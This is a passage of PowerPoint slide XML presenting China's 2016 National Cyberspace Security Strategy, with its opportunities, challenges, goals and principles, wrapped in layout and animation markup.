                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>2016</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2215" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>年</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2215" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>12</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2215" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>月</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2215" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>27</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2215" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>日</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2215" b="1" dirty="0">
              <a:latin typeface="+mn-ea"/>
              <a:ea typeface="+mn-ea"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2215" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>发布单位：国家互联网信息办公室</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="矩形 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6660232" y="2780928"/>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t>信息传播的新渠道</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="矩形 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6660231" y="3212976"/>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solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>生产生活的新空间</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="矩形 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6660230" y="3635732"/>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zh-CN" altLang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>经济发展的新引擎</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="矩形 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6660230" y="4067780"/>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solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>文化繁荣的新载体</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="矩形 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6660232" y="4499828"/>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solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>社会治理的新平台</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="矩形 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6642206" y="4931876"/>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solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>交流合作的新纽带</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="矩形 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6660230" y="5363924"/>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solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>国家主权的新疆域</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="16" name="图片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39" y="2713618"/>
            <a:ext cx="4133149" cy="2582892"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="18" name="组合 17"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="4209692" y="2358377"/>
            <a:ext cx="2313325" cy="1215328"/>
            <a:chOff x="4209692" y="2358377"/>
            <a:chExt cx="2313325" cy="1215328"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="8" name="剪去单角的矩形 7"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="4938841" y="3042453"/>
              <a:ext cx="1584176" cy="504056"/>
            </a:xfrm>
            <a:prstGeom prst="snip1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a:t>重大机遇</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="17" name="图片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9692" y="2358377"/>
              <a:ext cx="1215328" cy="1215328"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
        </p:pic>
      </p:grpSp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="33059163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3923928" y="2154922"/>
            <a:ext cx="4368504"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t>网络渗透危害政治安全</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="矩形 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3923928" y="2627620"/>
            <a:ext cx="4368504"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t>网络攻击威胁经济安全</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="矩形 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3923928" y="3131676"/>
            <a:ext cx="4368504"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t>网络有害信息侵蚀文化安全</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="矩形 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3923928" y="3635732"/>
            <a:ext cx="4368504"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t>网络恐怖和违法犯罪破坏社会安全</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="矩形 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3923928" y="4139788"/>
            <a:ext cx="4368504"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t>网络空间的国际竞争方兴未艾</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="矩形 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3923928" y="4643844"/>
            <a:ext cx="4368504" cy="369332"/>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r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0"/>
              <a:t>网络空间机遇和挑战并存，机遇大于挑战</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="14" name="组合 13"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="755576" y="1569730"/>
            <a:ext cx="2664296" cy="1170384"/>
            <a:chOff x="1187624" y="2020362"/>
            <a:chExt cx="2664296" cy="1170384"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="6" name="矩形 5"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="1691680" y="2605554"/>
              <a:ext cx="2160240" cy="461665"/>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zh-CN" altLang="en-US" b="1" dirty="0"/>
                <a:t>     </a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0"/>
                <a:t>严峻挑战</a:t>
              </a:r>
              <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>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2020362"/>
              <a:ext cx="1170384" cy="1170384"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
        </p:pic>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="矩形 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="317989" y="902677"/>
            <a:ext cx="4179349" cy="433196"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2215" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>中国</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2215" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>《</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2215" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>国家网络空间安全战略</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2215" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>》</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2215" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
              <a:latin typeface="+mn-ea"/>
              <a:ea typeface="+mn-ea"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </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3255599"/>
            <a:ext cx="3326140" cy="2660912"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="34596428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1000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="8"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="18" dur="1000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="8"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_y</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="1+#ppt_h/2"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_y"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                            </p:childTnLst>
                          </p:cTn>
                        </p:par>
                        <p:par>
                          <p:cTn id="19" fill="hold">
                            <p:stCondLst>
                              <p:cond delay="2000"/>
                            </p:stCondLst>
                            <p:childTnLst>
                              <p:par>
                                <p:cTn id="20" presetID="2" presetClass="entr" presetSubtype="4"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1000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="9"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="23" dur="1000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="9"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_y</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="1+#ppt_h/2"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_y"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                            </p:childTnLst>
                          </p:cTn>
                        </p:par>
                        <p:par>
                          <p:cTn id="24" fill="hold">
                            <p:stCondLst>
                              <p:cond delay="3000"/>
                            </p:stCondLst>
                            <p:childTnLst>
                              <p:par>
                                <p:cTn id="25" presetID="2" presetClass="entr" presetSubtype="4"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1000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="10"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="28" dur="1000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="10"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_y</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="1+#ppt_h/2"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_y"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                            </p:childTnLst>
                          </p:cTn>
                        </p:par>
                        <p:par>
                          <p:cTn id="29" fill="hold">
                            <p:stCondLst>
                              <p:cond delay="4000"/>
                            </p:stCondLst>
                            <p:childTnLst>
                              <p:par>
                                <p:cTn id="30" presetID="2" presetClass="entr" presetSubtype="4"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1000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="11"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="33" dur="1000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="11"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_y</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="1+#ppt_h/2"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_y"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                            </p:childTnLst>
                          </p:cTn>
                        </p:par>
                        <p:par>
                          <p:cTn id="34" fill="hold">
                            <p:stCondLst>
                              <p:cond delay="5000"/>
                            </p:stCondLst>
                            <p:childTnLst>
                              <p:par>
                                <p:cTn id="35" presetID="2" presetClass="entr" presetSubtype="4"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1000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="12"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="38" dur="10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899592" y="1992213"/>
            <a:ext cx="2304256" cy="985638"/>
            <a:chOff x="899592" y="764704"/>
            <a:chExt cx="2304256" cy="985638"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="7" name="对角圆角矩形 6"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="1691680" y="1196752"/>
              <a:ext cx="1512168" cy="432048"/>
            </a:xfrm>
            <a:prstGeom prst="round2Diag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b="1" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="FF0000"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>个目标</a:t>
              </a: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9592" y="764704"/>
              <a:ext cx="985638" cy="985638"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
        </p:pic>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="五边形 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1677590" y="2977851"/>
            <a:ext cx="978408" cy="385441"/>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ltLang="zh-CN" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0"/>
              <a:t>和平</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="燕尾形 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3777964" y="2977851"/>
            <a:ext cx="1224137" cy="385441"/>
          </a:xfrm>
          <a:prstGeom prst="chevr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ltLang="zh-CN" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0"/>
              <a:t>开放</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0">
              <a:solidFill>
                <a:schemeClr val="tx1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="燕尾形 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2591779" y="2977851"/>
            <a:ext cx="1224137" cy="385441"/>
          </a:xfrm>
          <a:prstGeom prst="chevr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ltLang="zh-CN" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0"/>
              <a:t>安全</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0">
              <a:solidFill>
                <a:schemeClr val="tx1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="燕尾形 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4964151" y="2977851"/>
            <a:ext cx="1224137" cy="385441"/>
          </a:xfrm>
          <a:prstGeom prst="chevr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ltLang="zh-CN" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0"/>
              <a:t>合作</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0">
              <a:solidFill>
                <a:schemeClr val="tx1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="燕尾形 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6156176" y="2977851"/>
            <a:ext cx="1224137" cy="385441"/>
          </a:xfrm>
          <a:prstGeom prst="chevr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ltLang="zh-CN" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0"/>
              <a:t>有序</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0">
              <a:solidFill>
                <a:schemeClr val="tx1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="24" name="组合 23"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="965757" y="3696052"/>
            <a:ext cx="2238091" cy="1013956"/>
            <a:chOff x="965757" y="2206656"/>
            <a:chExt cx="2238091" cy="1013956"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="21" name="对角圆角矩形 20"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="1691680" y="2717691"/>
              <a:ext cx="1512168" cy="432048"/>
            </a:xfrm>
            <a:prstGeom prst="round2Diag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b="1" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="FF0000"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>项原则</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5757" y="2206656"/>
              <a:ext cx="1013956" cy="1013956"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
        </p:pic>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="矩形 24"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1115616" y="4848290"/>
            <a:ext cx="2509020"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solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>尊重维护网络空间主权</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="矩形 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3995936" y="4848290"/>
            <a:ext cx="2502132" cy="36933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zh-CN" altLang="en-US" b="1" dirty="0"/>
              <a:t>和平利用网络空间</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27" name="矩形 26"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1115616" y="5291916"/>
            <a:ext cx="2509020" cy="36933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zh-CN" altLang="en-US" b="1" dirty="0"/>
              <a:t>依法治理网络空间</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="矩形 27"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3995936" y="5291916"/>
            <a:ext cx="2502132" cy="36933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zh-CN" altLang="en-US" b="1" dirty="0"/>
              <a:t>统筹网络安全与发展</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="29" name="矩形 28"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="317989" y="902677"/>
            <a:ext cx="4179349" cy="433196"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:r>
